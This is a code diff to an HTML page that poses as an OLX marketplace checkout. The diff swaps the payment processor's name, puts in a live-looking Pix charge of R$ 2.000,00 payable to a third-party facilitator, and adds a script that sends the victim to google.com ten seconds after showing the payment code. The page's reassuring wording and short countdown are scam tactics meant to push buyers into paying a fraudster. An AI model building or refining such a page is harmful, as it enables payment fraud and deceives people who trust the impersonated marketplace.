@@ -116,7 +116,7 @@
   <!-- TELA 2 -->
   <div class="container" id="pagamento">
     <div class="alerta">
-      ⚠️ Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a <strong>Zoop Tecnologia</strong>, cuida do pagamento até você receber seu produto!
+      ⚠️ Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a <strong>AVERIOPAY</strong>, cuida do pagamento até você receber seu produto!
     </div>
 
     <p><strong>Seu código expira em:</strong> <span class="tempo" id="contador">04m 39s</span></p>
@@ -124,16 +124,18 @@
     <div style="margin-top: 15px;">
       <p><strong>Pague por Pix</strong></p>
       <p class="valor">R$ 2.000,00</p>
-      <p><strong>Processado por</strong><br>Zoop tecnologia</p>
+      <p><strong>Processado por</strong><br>AVERIOPAY</p>
     </div>
 
     <p style="margin-top: 15px;"><strong>Copie o código de pagamento:</strong></p>
-    <div class="pix-code" id="pixcode">00020101021226850014br.gov.bcb.pix.qr1234567890abcde</div>
+    <div class="pix-code" id="pixcode">
+      00020101021226880014br.gov.bcb.pix2566qrcodes.saq.digital/v2/qr/cob/784d6f87-e473-4d52-a3ce-e411df95145c5204000053039865802BR5925AVEIROPAY FACILITADORA DE6009SAO PAULO62070503***630420FE
+    </div>
     <button onclick="copiarPix()">Copiar código Pix</button>
 
     <ol>
       <li>Acesse o app do seu banco ou Internet Banking e escolha Pix copia e cola.</li>
-      <li>Cole o código, confira se o pagamento será feito para Zoop Tecnologia.</li>
+      <li>Cole o código, confira se o pagamento será feito para AVERIOPAY.</li>
       <li>Confirme o pagamento.</li>
       <li>Prontinho! Acompanhe o pedido em <a href="#">Minhas Compras</a></li>
     </ol>
@@ -156,6 +158,7 @@
         pagamento.style.display = "block";
         window.scrollTo(0, 0);
         iniciarContador(279); // 4m39s = 279 segundos
+        redirecionarDepois();
       }).catch(() => {
         alert("Erro ao enviar os dados. Tente novamente.");
       });
@@ -179,7 +182,12 @@
         }
       }, 1000);
     }
-  </script>
 
+    function redirecionarDepois() {
+      setTimeout(() => {
+        window.location.href = "https://www.google.com"; // Altere essa URL se quiser outro destino
+      }, 10000); // Redireciona após 10 segundos
+    }
+  </script>
 </body>
 </html>
